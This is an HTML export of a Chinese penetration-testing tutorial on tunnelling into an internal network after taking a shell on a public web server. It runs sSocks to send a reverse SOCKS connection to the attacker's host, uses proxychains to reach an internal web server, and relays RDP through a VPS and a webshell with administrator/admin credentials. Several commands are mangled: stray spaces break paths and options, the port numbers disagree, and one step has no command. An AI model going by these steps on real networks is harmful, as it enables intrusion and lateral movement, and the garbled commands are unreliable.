<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="利用ssocks进行内网穿透"><span class="csECDA2D3">利用</span><span class="csDE05BCC">ssocks</span><span class="csECDA2D3">进行内网穿透</span></a></h1>
		<p class="cs40DD2BC9"><span class="cs8926E06">sSocks</span><span class="cs9C1B1871">是一个</span><span class="cs8926E06">socks</span><span class="cs9C1B1871">代理工具套装，可用来开启</span><span class="cs8926E06">socks</span><span class="cs9C1B1871">代理服务，支持</span><span class="cs8926E06">socks5</span><span class="cs9C1B1871">验证，支持</span><span class="cs8926E06">IPV6</span><span class="cs9C1B1871">和</span><span class="cs8926E06">UDP</span><span class="cs9C1B1871">，并提供反向</span><span class="cs8926E06">socks</span><span class="cs9C1B1871">代理服务，即将远程计算机作为</span><span class="cs8926E06">socks</span><span class="cs9C1B1871">代理服务端，反弹回本地，极大方便内网的渗透测试，而</span><span class="cs8926E06">proxychains</span><span class="cs9C1B1871">代理链是</span><span class="cs8926E06">Linux</span><span class="cs9C1B1871">下一款代理设置工具。由于</span><span class="cs8926E06">Ssocks</span><span class="cs9C1B1871">不稳定，所以不建议使用。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">现在有这么一个环境，我们获取到了位于公网</span><span class="cs8926E06">Web</span><span class="cs9C1B1871">服务器的</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">，该</span><span class="cs8926E06">web</span><span class="cs9C1B1871">服务器是</span><span class="cs8926E06">Linux</span><span class="cs9C1B1871">系统，内网中存在另外一台主机，这里假设内网存在一台</span><span class="cs8926E06">Web</span><span class="cs9C1B1871">服务器。然后，我们现在要将公网</span><span class="cs8926E06">Web</span><span class="cs9C1B1871">服务器设置为代理，访问和探测内网</span><span class="cs8926E06">Web</span><span class="cs9C1B1871">服务器的信息。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先，我们的主机和公网的</span><span class="cs8926E06">Web</span><span class="cs9C1B1871">服务器都得安装上</span><span class="cs8926E06">Ssocks</span><span class="cs9C1B1871">。</span><span class="cs8926E06"> proxychains</span><span class="cs9C1B1871">的话</span><span class="cs8926E06"> linux(</span><span class="cs9C1B1871">基于</span><span class="cs8926E06">debian)</span><span class="cs9C1B1871">下直接</span><span class="cs8926E06">apt install proxychains </span><span class="cs9C1B1871">就可以了</span></p><h4 class="cs868C439D">
			<a name="web服务器的操作"><span class="csBF12A472">Web</span><span class="cs6EDCDAE2">服务器的操作</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">./rssocks -vv -s 100.100.10.13:9999 &nbsp;&nbsp;#</span><span class="cs7FFD2630">接收</span><span class="cs9FB05234">100.100.10.13</span><span class="cs7FFD2630">的</span><span class="cs9FB05234">9999</span><span class="cs7FFD2630">端口的流量</span></p><p class="cs40DD2BC9"><span><img src="内网渗透/内网穿透工具/ssocks_files/image0.png" width="560" height="255" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="主机的操作"><span class="cs83F14626">主机的操作</span></a></h2>
		<p class="cs3A447A38"><span class="cs7FFD2630">首先配置</span><span class="cs9FB05234">proxychains</span><span class="cs7FFD2630">代理链的配置文件，把最后的内容改成</span><span class="cs9FB05234"> &nbsp;socks5 127.0.0.1 8080 </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">./rcsocks -l 1080 -p 9999 -vv &nbsp;&nbsp;#</span><span class="cs7FFD2630">然后将本地的</span><span class="cs9FB05234">1080</span><span class="cs7FFD2630">端口的流量转发到</span><span class="cs9FB05234">9999</span><span class="cs7FFD2630">端口</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">接下来，我们想要访问和操作操作内网主机</span><span class="cs9FB05234">192.168.10.19</span><span class="cs7FFD2630">的话，只需要在命令前面加上</span><span class="cs9FB05234"> proxychains</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">比如，获得内网</span><span class="cs9FB05234">Web</span><span class="cs7FFD2630">服务器的网页文件：</span><span class="cs9FB05234"> proxychains curl 192.168.10.19</span></p><p class="cs40DD2BC9"><span><img src="内网渗透/内网穿透工具/ssocks_files/image1.png" width="560" height="199" alt="" style="border-width:0px;" /></span><span class="cs8926E06">&nbsp;<img src="内网渗透/内网穿透工具/ssocks_files/image2.png" width="560" height="80" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="ssocks转发的其他操作"><span class="csB2D98684">ssocks</span><span class="cs83F14626">转发的其他操作</span></a></h2>
		<p class="cs3A447A38"><span class="cs7FFD2630">第一步，用</span><span class="cs9FB05234">sSocks</span><span class="cs7FFD2630">在</span><span class="cs9FB05234">VPS</span><span class="cs7FFD2630">上建立</span><span class="cs9FB05234">3388</span><span class="cs7FFD2630">与</span><span class="cs9FB05234">3389</span><span class="cs7FFD2630">端口对应关系，实现流量互通：</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">root @ kali</span><span class="cs7FFD2630">：〜＃</span><span class="cs9FB05234">/ root / ssocks-0.0.14 / src / rcsocks -l 3389 -p 3389 -vv</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">第二步，从攻击端连接</span><span class="cs9FB05234">VPS</span><span class="cs7FFD2630">的</span><span class="cs9FB05234">3388</span><span class="cs7FFD2630">端口，建议用</span><span class="cs9FB05234">freerdp</span><span class="cs7FFD2630">而非</span><span class="cs9FB05234">rdesktop</span><span class="cs7FFD2630">，因为前者支持远程与本地连接等待，文本复制粘贴，挂载远程文件系统：</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">root @kali</span><span class="cs7FFD2630">：〜＃</span><span class="cs9FB05234">xfreerdp / u</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">administrator / p</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">admin / v</span><span class="cs7FFD2630">：【你的</span><span class="cs9FB05234">ip</span><span class="cs7FFD2630">】：</span><span class="cs9FB05234">3389</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">第三步，立即在大马上执行端口转发，可能需要连续多次点击开始：</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">注意，整个过程对步骤先后顺序敏感，</span><span class="cs9FB05234">VPS</span><span class="cs7FFD2630">上</span><span class="cs9FB05234">rcsocks</span><span class="cs7FFD2630">端口映射好以后就可以不管了，先在攻击端执行</span><span class="cs9FB05234">xfreerdp</span><span class="cs7FFD2630">，让其会话保持，再在</span><span class="cs9FB05234">webshel​​l</span><span class="cs7FFD2630">上转发内网的</span><span class="cs9FB05234">3389</span></p></body>
</html>
